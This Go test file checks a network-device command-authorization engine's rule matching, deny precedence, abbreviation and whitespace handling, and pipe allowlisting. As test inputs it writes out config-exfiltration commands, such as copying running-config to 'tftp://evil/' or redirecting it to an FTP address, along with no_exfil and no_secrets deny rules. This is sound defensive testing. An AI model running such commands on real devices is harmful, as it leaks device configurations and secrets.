package engine

import (
	"math/rand"
	"reflect"
	"strings"
	"testing"

	"github.com/rhwendt/port49/internal/decision"
)

// program compiles a blob from "permit rule" and "deny rule" lines, one role
// per line ("role:verdict rule"), with EOS's classes and the default pipe
// allowlist.
func program(t *testing.T, expands bool, lines ...string) *Program {
	t.Helper()
	return compileBlob(t, testBlob(expands, lines...))
}

// testBlob is program's blob before it is compiled, for a test that changes
// the dialect or the allowlist first.
func testBlob(expands bool, lines ...string) Blob {
	b := Blob{Version: Version, Bundle: "b", Platform: "arista_eos",
		Normalize: Normalize{PipeToken: "|", StripCR: true, ExpandsAbbreviations: expands},
		Pipe:      []string{"include **", "exclude **", "begin **", "section **", "json", "count", "no-more"},
		Classes: map[string][]string{
			"management":     {`^Management[0-9]+$`},
			"physical":       {`^Ethernet[0-9/.]+$`, `^Port-Channel[0-9]+$`},
			"backup_targets": {`^scp://backup\.example\.com/`},
		}}
	for _, l := range lines {
		role, rest, _ := strings.Cut(l, ":")
		verdict, rule, _ := strings.Cut(rest, " ")
		b.Rules = append(b.Rules, Rule{Verdict: verdict, Rule: rule, Role: role})
	}
	return b
}

func compileBlob(t *testing.T, b Blob) *Program {
	t.Helper()
	// Classes no rule names are dropped by Encode, not by Compile; keep only
	// what is named so the blob is one Encode would write.
	body, hash, err := Encode(b)
	if err != nil {
		t.Fatal(err)
	}
	decoded, err := Decode(hash, body)
	if err != nil {
		t.Fatal(err)
	}
	p, err := Compile(decoded)
	if err != nil {
		t.Fatal(err)
	}
	return p
}

// cmd builds the AV pairs a device sends for a typed command line, ending in
// the `<cr>` every measured platform sends (tests/lab/results/L10-*.md).
func cmd(line string) []string {
	f := strings.Fields(line)
	raw := []string{"service=shell", "cmd=" + f[0]}
	for _, a := range f[1:] {
		raw = append(raw, "cmd-arg="+a)
	}
	return append(raw, "cmd-arg=<cr>")
}

func expect(t *testing.T, p *Program, line string, permit bool, reason decision.Reason) Outcome {
	t.Helper()
	o := p.Command(cmd(line))
	if o.Permit != permit || o.Reason != reason {
		t.Errorf("%q: permit=%v %s, want permit=%v %s (deny %+v, permits %+v)",
			line, o.Permit, o.Reason, permit, reason, o.Deny, o.Permits)
	}
	return o
}

// Spec §14, "Matching and precedence": full-vector matching.
func TestRulesMatchTheFullVector(t *testing.T) {
	p := program(t, true, "r:permit show bgp summary", "r:permit show **")
	o := expect(t, p, "show bgp summary", true, decision.PermitDominates)
	if o.Decided.Rule != "show bgp summary" || !reflect.DeepEqual(o.Decided.Specificity, []int{3, 3, 3}) {
		t.Errorf("the more specific permit decides: %+v", o.Decided)
	}
	q := program(t, true, "r:permit show bgp summary")
	expect(t, q, "show bgp summary detail", false, decision.NoRuleMatched)
	expect(t, q, "show bgp", false, decision.NoRuleMatched)
}

// Case is compared, never changed: `SHOW RUN` matches `show run`, a class
// matches whatever case the device sends, and `(?-i)` opts a regex out.
func TestComparisonIsCaseInsensitiveAndTheVectorIsNot(t *testing.T) {
	p := program(t, true, "r:permit show run", "r:permit interface /(?-i)^Ethernet1$/",
		"r:permit **", "m:deny interface @management")
	o := expect(t, p, "SHOW RUN", true, decision.PermitDominates)
	if o.Decided.Rule != "show run" || !reflect.DeepEqual(o.Vector, []string{"SHOW", "RUN"}) {
		t.Errorf("matched %+v on vector %q; the vector must be left as received", o.Decided, o.Vector)
	}
	expect(t, p, "interface MANAGEMENT1", false, decision.NoPermitDominatesDeny)
	if o := p.Command(cmd("interface Ethernet1")); o.Decided.Rule != "interface /(?-i)^Ethernet1$/" {
		t.Errorf("the case-sensitive regex matches its own case: %+v", o.Decided)
	}
	if o := p.Command(cmd("interface ethernet1")); o.Decided.Rule != "**" {
		t.Errorf("and not another: %+v", o.Decided)
	}
}

// Dominance, permitting: an exception at least as precise at every position.
func TestANarrowerPermitDominatesABroaderDeny(t *testing.T) {
	p := program(t, true, "backup:permit show chassis hardware", "cve:deny show chassis **")
	o := expect(t, p, "show chassis hardware", true, decision.PermitDominates)
	if o.Deny == nil || o.Deny.Rule != "show chassis **" {
		t.Errorf("the permit's record names the deny it overrode: %+v", o.Deny)
	}
	// Only the deny matches, so it is denied, and no permit is there to name.
	expect(t, p, "show chassis hardware detail", false, decision.NoRuleMatched)
	// Every deny a winning permit overrode is on the outcome, not only the
	// one the record names.
	two := program(t, true, "backup:permit show chassis hardware", "cve:deny show chassis **", "old:deny show * hardware")
	if o := expect(t, two, "show chassis hardware", true, decision.PermitDominates); len(o.Denies) != 2 ||
		o.Denies[0].Rule != "show chassis **" || o.Denies[1].Rule != "show * hardware" {
		t.Errorf("both overridden denies: %+v", o.Denies)
	}
}

// Dominance, denying: each of spec §14's four cases, and equal tuples.
func TestNoPermitDominatesTheseDenies(t *testing.T) {
	for _, tt := range []struct{ permit, deny, line string }{
		{"copy **", "* * /^tftp:/", "copy running-config tftp://evil/"},
		{"copy * *", "* * /^tftp:/", "copy running-config tftp://evil/"},
		{"clear bgp **", "* * all", "clear bgp all"},
		{"interface @physical", "interface /^Ethernet1$/", "interface Ethernet1"},
		{"interface /^Ethernet1$/", "interface @physical", "interface Ethernet1"},
		{"show version", "show version", "show version"},
	} {
		p := program(t, true, "op:permit "+tt.permit, "no_exfil:deny "+tt.deny)
		o := expect(t, p, tt.line, false, decision.NoPermitDominatesDeny)
		if o.Deny == nil || o.Deny.Rule != CanonicalRule(tt.deny) || o.Decided != o.Deny {
			t.Errorf("%q vs %q: the record names the deny: %+v", tt.permit, tt.deny, o.Deny)
		}
	}
}

// Buying it back: the destination has to be named too.
func TestAnExceptionMustBeAsPreciseAtEveryPosition(t *testing.T) {
	yes := program(t, true, "backup:permit copy running-config @backup_targets", "no_exfil:deny * * /^scp:/")
	expect(t, yes, "copy running-config scp://backup.example.com/leaf1", true, decision.PermitDominates)
	no := program(t, true, "backup:permit copy running-config *", "no_exfil:deny * * /^scp:/")
	expect(t, no, "copy running-config scp://backup.example.com/leaf1", false, decision.NoPermitDominatesDeny)
}

// Output modifiers are allow-listed, and every stage is checked on its own.
func TestEveryPipelineStageIsChecked(t *testing.T) {
	p := program(t, true, "r:permit show **")
	o := expect(t, p, "show running-config | redirect ftp://10.9.9.9/cfg", false, decision.PipeStageDenied)
	if o.Stage != 1 || !reflect.DeepEqual(o.Vector, []string{"show", "running-config"}) ||
		!reflect.DeepEqual(o.Pipeline, [][]string{{"redirect", "ftp://10.9.9.9/cfg"}}) {
		t.Errorf("split: %q %q stage %d", o.Vector, o.Pipeline, o.Stage)
	}
	expect(t, p, "show run | section bgp | include neighbor", true, decision.PermitDominates)
	if o := expect(t, p, "show run | section bgp | append flash:x", false, decision.PipeStageDenied); o.Stage != 2 {
		t.Errorf("the second stage is the one refused: %d", o.Stage)
	}
	if o := p.Command(cmd("show run |")); o.Reason != decision.PipeStageDenied {
		t.Errorf("an empty stage matches no allowlist entry: %+v", o)
	}
}

// Spec §3 rule 4, on a platform that may send what was typed: an abbreviation
// of a deny's word is denied, never slipped past it, and a permit is matched
// only as written — so an abbreviated command is denied or matched, never
// silently unmatched by the deny it abbreviates.
func TestAnAbbreviationCannotSlipPastADeny(t *testing.T) {
	typed := program(t, false, "admin:permit **", "no_disruptive:deny reload **")
	o := expect(t, typed, "rel", false, decision.NoPermitDominatesDeny)
	if o.Deny.Rule != "reload **" || !reflect.DeepEqual(o.Deny.Specificity, []int{3}) {
		t.Errorf("the abbreviation matched the deny's word: %+v", o.Deny)
	}
	expect(t, typed, "sh run", true, decision.PermitDominates)
	ro := program(t, false, "ro:permit show **")
	expect(t, ro, "sh run", false, decision.NoRuleMatched)
	resolved := program(t, true, "admin:permit **", "no_disruptive:deny reload **")
	expect(t, resolved, "rel", true, decision.PermitDominates)
}

// Specificity is a property of the rule and the command, never of position, so
// shuffling the rules changes no outcome, not even which rule is named
// (spec §5.4; §14, "Order independence").
func TestEvaluationIsOrderIndependent(t *testing.T) {
	lines := []string{"a:permit show **", "b:permit show chassis hardware", "c:deny show chassis **",
		"d:permit copy running-config *", "e:deny * * /^tftp:/", "f:permit **", "g:deny reload **", "h:permit show **"}
	commands := []string{"show chassis hardware", "show chassis cluster", "copy running-config tftp://x",
		"reload now", "show version", "configure", "show run | redirect x"}
	want := map[string]Outcome{}
	base := program(t, true, lines...)
	for _, c := range commands {
		want[c] = base.Command(cmd(c))
	}
	r := rand.New(rand.NewSource(49))
	for i := 0; i < 20; i++ {
		shuffled := append([]string(nil), lines...)
		r.Shuffle(len(shuffled), func(i, j int) { shuffled[i], shuffled[j] = shuffled[j], shuffled[i] })
		p := program(t, true, shuffled...)
		for _, c := range commands {
			if got := p.Command(cmd(c)); !reflect.DeepEqual(got, want[c]) {
				t.Fatalf("%q under %q:\n got %+v\nwant %+v", c, shuffled, got, want[c])
			}
		}
	}
}

// The record's policy block is spec §5.7's: the deciding permit first, the
// deny it faced, and a server_msg that is printable ASCII naming the rule.
func TestTheOutcomeRendersForTheRecordAndTheDevice(t *testing.T) {
	p := program(t, true, "net_operator:permit copy **", "no_exfil:deny * * /^tftp:/")
	o := p.Command(cmd("copy running-config tftp://10.9.9.9/x"))
	pol := o.Policy("sha256:bundle", "sha256:blob")
	if pol.Bundle != "sha256:bundle" || pol.Blob != "sha256:blob" || pol.MatchedDeny == nil ||
		!reflect.DeepEqual(pol.MatchedDeny.Rule, []string{"*", "*", "/^tftp:/"}) ||
		!reflect.DeepEqual(pol.MatchedDeny.Specificity, []int{1, 1, 2}) || pol.MatchedDeny.Role != "no_exfil" ||
		len(pol.MatchedPermits) != 1 || !reflect.DeepEqual(pol.MatchedPermits[0].Specificity, []int{3, 0, 0}) {
		t.Fatalf("policy block: %+v", pol)
	}
	if msg := o.ServerMsg(); msg != "port49: denied by no_exfil (* * /^tftp:/) - see 'port49 explain'" {
		t.Fatalf("server_msg: %q", msg)
	}
	if msg := (Outcome{Reason: decision.NoPermitDominatesDeny, Deny: &Match{Role: "r", Rule: "show /é/"}}).ServerMsg(); strings.ContainsFunc(msg, func(r rune) bool { return r < 0x20 || r > 0x7e }) {
		t.Fatalf("server_msg is printable ASCII: %q", msg)
	}
	if o := p.Command(cmd("configure")); o.ServerMsg() == "" || strings.Contains(o.ServerMsg(), "configure") {
		t.Fatalf("no_rule_matched says so without echoing the request: %q", o.ServerMsg())
	}
}

// The first permit in sorted order does not always dominate; the one that
// does decides, goes first, and the record's order is otherwise kept.
func TestTheDominatingPermitDecidesEvenWhenAnotherSortsFirst(t *testing.T) {
	p := program(t, true, "a:permit show chassis *", "b:permit show * cluster", "c:deny show * /^cl/")
	o := expect(t, p, "show chassis cluster", true, decision.PermitDominates)
	if o.Decided.Role != "b" || o.Permits[0].Role != "b" || len(o.Permits) != 2 {
		t.Fatalf("decided %+v, permits %+v", o.Decided, o.Permits)
	}
}

// A request with no command, or only whitespace for one, is not a command
// authorization (spec §5.2 owns it), so Command denies it rather than let
// `**` permit it — replay and explain call Command on a record's raw directly.
func TestACommandWithNoWordsIsDenied(t *testing.T) {
	p := program(t, true, "admin:permit **")
	for _, raw := range [][]string{
		{"service=shell"},
		{"service=shell", "cmd="},
		{"service=shell", "cmd= ", "cmd-arg=<cr>"},
		{"service=shell", "cmd=\t", "cmd-arg=x", "cmd-arg=<cr>"},
	} {
		if o := p.Command(raw); o.Permit || o.Reason != decision.NoRuleMatched || o.Decided != nil {
			t.Errorf("%q: %+v", raw, o)
		}
	}
}

// A deny compares an argument both as received and trimmed, so whitespace
// only ever makes a deny match more: `reload ` is still the deny's `reload`,
// and the vector is left exactly as received.
func TestWhitespaceAroundAnArgumentCannotSlipPastADeny(t *testing.T) {
	p := program(t, true, "admin:permit **", "no_disruptive:deny reload **", "no_exfil:deny copy * /^tftp:/")
	for _, raw := range [][]string{
		{"service=shell", "cmd=reload ", "cmd-arg=<cr>"},
		{"service=shell", "cmd= reload", "cmd-arg=<cr>"},
		{"service=shell", "cmd=reload\t", "cmd-arg= now ", "cmd-arg=<cr>"},
		{"service=shell", "cmd=copy", "cmd-arg=running-config", "cmd-arg= tftp://x", "cmd-arg=<cr>"},
	} {
		o := p.Command(raw)
		if o.Permit || o.Reason != decision.NoPermitDominatesDeny {
			t.Errorf("%q: permit=%v %s", raw, o.Permit, o.Reason)
		}
		if want, _ := p.Blob.Normalize.Normalize(raw); !reflect.DeepEqual(o.Vector, want) || o.Vector[0] != strings.TrimPrefix(raw[1], "cmd=") {
			t.Errorf("%q: the vector must be left as received: %q", raw, o.Vector)
		}
	}
}

// An argument with whitespace inside it is one argument (spec §3: never split
// or re-joined), so a fixed-length deny still matches it by position. These
// were denied at 2bf2fe9, permitted when c571cc0 split on whitespace, and are
// denied again.
func TestAnArgumentWithSpacesInsideIsOneArgument(t *testing.T) {
	secret := program(t, true, "admin:permit username **", "no_secrets:deny username * secret *")
	o := secret.Command([]string{"service=shell", "cmd=username", "cmd-arg=bob", "cmd-arg=secret", `cmd-arg="a b"`, "cmd-arg=<cr>"})
	if o.Permit || o.Reason != decision.NoPermitDominatesDeny || len(o.Vector) != 4 {
		t.Errorf("username bob secret \"a b\": permit=%v %s on %q", o.Permit, o.Reason, o.Vector)
	}
	copyTFTP := program(t, true, "admin:permit copy **", "no_exfil:deny * /tftp/")
	o = copyTFTP.Command([]string{"service=shell", "cmd=copy", "cmd-arg=running-config tftp://x", "cmd-arg=<cr>"})
	if o.Permit || o.Reason != decision.NoPermitDominatesDeny || len(o.Vector) != 2 {
		t.Errorf("copy \"running-config tftp://x\": permit=%v %s on %q", o.Permit, o.Reason, o.Vector)
	}
	// A pipe token inside an argument is not the pipe token: the split is at
	// an argument equal to it, and nothing else.
	o = copyTFTP.Command([]string{"service=shell", "cmd=show", "cmd-arg=run | redirect x", "cmd-arg=<cr>"})
	if !reflect.DeepEqual(o.Vector, []string{"show", "run | redirect x"}) || len(o.Pipeline) != 0 {
		t.Errorf("split inside an argument: %q %q", o.Vector, o.Pipeline)
	}
}

// Every stage is checked whatever pipe_authorized says: a platform that does
// not send its pipes has nothing to check, and one that does is allow-listed
// all the same, so no dialect setting skips the check.
func TestPipeStagesAreCheckedWhetherOrNotThePlatformAuthorizesThem(t *testing.T) {
	for _, authorized := range []bool{false, true} {
		b := testBlob(true, "r:permit show **")
		b.Normalize.PipeAuthorized = authorized
		p := compileBlob(t, b)
		expect(t, p, "show run | redirect x", false, decision.PipeStageDenied)
		expect(t, p, "show run | include bgp", true, decision.PermitDominates)
	}
}

// With strip_cr off, `<cr>` is an argument like any other and must be
// matched; with an empty allowlist, every stage is refused.
func TestStripCROffAndAnEmptyPipeAllowlist(t *testing.T) {
	b := testBlob(true, "r:permit show run", "s:permit show **")
	b.Normalize.StripCR = false
	o := expect(t, compileBlob(t, b), "show run", true, decision.PermitDominates)
	if !reflect.DeepEqual(o.Vector, []string{"show", "run", "<cr>"}) || o.Decided.Rule != "show **" {
		t.Errorf("<cr> kept and matched: %q by %+v", o.Vector, o.Decided)
	}
	b = testBlob(true, "r:permit show **")
	b.Pipe = nil
	p := compileBlob(t, b)
	expect(t, p, "show run", true, decision.PermitDominates)
	if o := expect(t, p, "show run | include bgp", false, decision.PipeStageDenied); o.Stage != 1 {
		t.Errorf("stage %d", o.Stage)
	}
}

// Trimming whitespace is deny-only, like abbreviation (spec §3 rule 4): a
// permit that matched `hardware ` would newly dominate the deny, so a permit
// and a pipe allow-list entry match each argument exactly as received. This
// command was denied at 2bf2fe9, permitted at 7cf55b9, and is denied again.
func TestWhitespaceNeverWidensAPermit(t *testing.T) {
	p := program(t, true, "a:permit show **", "b:permit show chassis hardware", "c:deny show chassis **")
	o := p.Command([]string{"service=shell", "cmd=show", "cmd-arg=chassis", "cmd-arg=hardware ", "cmd-arg=<cr>"})
	if o.Permit || o.Reason != decision.NoPermitDominatesDeny || o.Deny.Rule != "show chassis **" || len(o.Permits) != 1 {
		t.Errorf(`show chassis "hardware ": permit=%v %s, deny %+v, permits %+v`, o.Permit, o.Reason, o.Deny, o.Permits)
	}
	q := program(t, true, "r:permit show **")
	for _, stage := range []string{"json ", " count", "include "} {
		o := q.Command([]string{"service=shell", "cmd=show", "cmd-arg=run", "cmd-arg=|", "cmd-arg=" + stage, "cmd-arg=<cr>"})
		if o.Permit || o.Reason != decision.PipeStageDenied || o.Stage != 1 {
			t.Errorf("stage %q: permit=%v %s stage %d", stage, o.Permit, o.Reason, o.Stage)
		}
	}
}
